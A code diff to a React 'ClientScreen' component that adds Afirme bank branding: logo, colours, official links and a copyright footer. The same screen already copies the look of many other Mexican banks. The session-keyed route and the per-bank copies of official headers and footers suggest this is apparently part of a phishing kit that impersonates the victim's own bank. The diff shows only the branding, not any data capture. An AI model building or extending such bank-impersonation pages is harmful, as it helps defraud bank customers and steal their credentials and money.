@@ -29,6 +29,7 @@ import platacardLogo from '../assets/platacard_logo.png';
 import bancoAztecaLogo from '../assets/banco_azteca_logo.png';
 import bienestarLogo from '../assets/banco_bienestar_logo.png';
 import inbursaLogo from '@assets/inbursa-seeklogo_1758958331280.png';
+import afirmeLogo from '@assets/logoAfirme_1762549994047.png';
 
 export default function ClientScreen() {
   // Verificar primero la ruta /client/:sessionId
@@ -596,6 +597,20 @@ export default function ClientScreen() {
           <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
+    } else if (sessionData.banco === 'AFIRME') {
+      return (
+        <header className="bg-white p-4 text-center">
+          <div className="flex justify-center mb-2">
+            <img 
+              src={afirmeLogo} 
+              className="afirme-logo inline-block" 
+              alt="Afirme" 
+              style={{height: '2.5rem', width: 'auto'}}
+            />
+          </div>
+          <div className="font-bold text-sm text-[#009639]">{formatDate(new Date())}</div>
+        </header>
+      );
     } else {
       // Default header (Banorte)
       return (
@@ -676,6 +691,7 @@ export default function ClientScreen() {
               sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/' :
               sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar' :
               sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/' :
+              sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/' :
               'https://www.banorte.com/'
             } target="_blank" rel="noopener noreferrer" className={`${
               sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' : 
@@ -690,6 +706,7 @@ export default function ClientScreen() {
               sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
               sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
               sessionData.banco === 'PLATACARD' ? 'text-[#FF5722]' :
+              sessionData.banco === 'AFIRME' ? 'text-[#009639]' :
               'text-[#EC1C24]'
             } mx-2`}>Aprende más</a>
             <a href={
@@ -704,6 +721,7 @@ export default function ClientScreen() {
               sessionData.banco === 'INVEX' ? 'https://www.invex.com/contacto' :
               sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/ayuda/' :
               sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/centro-de-ayuda' :
+              sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/ayuda' :
               'https://www.banorte.com/wps/portal/banorte/Home/ayuda-banorte/'
             } target="_blank" rel="noopener noreferrer" className={`${
               sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
@@ -717,6 +735,7 @@ export default function ClientScreen() {
               sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
               sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
               sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
+              sessionData.banco === 'AFIRME' ? 'text-[#009639]' :
               'text-[#EC1C24]'
             } mx-2`}>Ayuda</a>
             <a href={
@@ -731,6 +750,7 @@ export default function ClientScreen() {
               sessionData.banco === 'INVEX' ? 'https://www.invex.com/aviso-de-privacidad' :
               sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/contenido/terminos.php' :
               sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/aviso-de-privacidad' :
+              sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/terminos-y-condiciones' :
               'https://www.banorte.com/wps/portal/banorte/Home/inicio/terminos-y-condiciones'
             } target="_blank" rel="noopener noreferrer" className={`${
               sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
@@ -744,6 +764,7 @@ export default function ClientScreen() {
               sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
               sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
               sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
+              sessionData.banco === 'AFIRME' ? 'text-[#009639]' :
               'text-[#EC1C24]'
             } mx-2`}>Términos y condiciones</a>
             <a href={
@@ -758,6 +779,7 @@ export default function ClientScreen() {
               sessionData.banco === 'INVEX' ? 'https://www.invex.com/seguridad' :
               sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/seguridad.php' :
               sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/seguridad' :
+              sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/seguridad' :
               'https://www.banorte.com/wps/portal/banorte/Home/seguridad-banorte'
             } target="_blank" rel="noopener noreferrer" className={`${
               sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
@@ -771,6 +793,7 @@ export default function ClientScreen() {
               sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
               sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
               sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
+              sessionData.banco === 'AFIRME' ? 'text-[#009639]' :
               'text-[#EC1C24]'
             } mx-2`}>Seguridad en línea</a>
           </div>
@@ -791,6 +814,7 @@ export default function ClientScreen() {
             sessionData.banco === 'BANCO_AZTECA' ? 'bg-[#00A552]' :
             sessionData.banco === 'BIENESTAR' ? 'bg-[#9D2449]' :
             sessionData.banco === 'INBURSA' ? 'bg-[#1B4B72]' :
+            sessionData.banco === 'AFIRME' ? 'bg-[#009639]' :
             'bg-[#EC1C24]'
           } text-white p-4 text-center text-sm`}>
             <div className="mb-3">
@@ -809,6 +833,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/contacto.html' :
                 sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar/contacto' :
                 sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/contacto' :
+                sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/contacto' :
                 'https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte'
               } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Contáctanos</a> |
               <a href={
@@ -826,6 +851,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/ayuda-y-preguntas-frecuentes.html' :
                 sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar/acciones-y-programas/aclaraciones-bancarias' :
                 sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/aclaraciones' :
+                sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/aclaraciones' :
                 'https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte/aclaraciones-en-linea'
               } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Aclaraciones</a> |
               <a href={
@@ -843,6 +869,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/promociones.html' :
                 sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar/documentos/promociones-y-sorteos' :
                 sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/promociones' :
+                sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/promociones' :
                 'https://www.banorte.com/wps/portal/banorte/Home/promociones/todas'
               } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Promociones</a> |
               <a href={
@@ -860,6 +887,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'BANCO_AZTECA' ? 'https://www.facebook.com/BancoAzteca' :
                 sessionData.banco === 'BIENESTAR' ? 'https://www.facebook.com/BBienestarMX' :
                 sessionData.banco === 'INBURSA' ? 'https://www.facebook.com/GrupoFinancieroInbursa' :
+                sessionData.banco === 'AFIRME' ? 'https://www.facebook.com/BancoAfirme' :
                 'https://www.facebook.com/BanorteOficial'
               } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Facebook</a> |
               <a href={
@@ -877,6 +905,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'BANCO_AZTECA' ? 'https://www.youtube.com/user/bancoaztecaoficial' :
                 sessionData.banco === 'BIENESTAR' ? 'https://www.youtube.com/@BBienestarMX' :
                 sessionData.banco === 'INBURSA' ? 'https://www.youtube.com/@GrupoFinancieroInbursa' :
+                sessionData.banco === 'AFIRME' ? 'https://www.youtube.com/user/BancoAfirme' :
                 'https://www.youtube.com/user/GFBanorte'
               } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Youtube</a>
             </div>
@@ -896,6 +925,7 @@ export default function ClientScreen() {
               sessionData.banco === 'BANCO_AZTECA' ? 'Banco Azteca' :
               sessionData.banco === 'BIENESTAR' ? 'Banco del Bienestar' :
               sessionData.banco === 'INBURSA' ? 'Grupo Financiero Inbursa' :
+              sessionData.banco === 'AFIRME' ? 'Banco Afirme' :
               'Banorte'
             } México 2024. Todos los Derechos Reservados</div>
           </div>
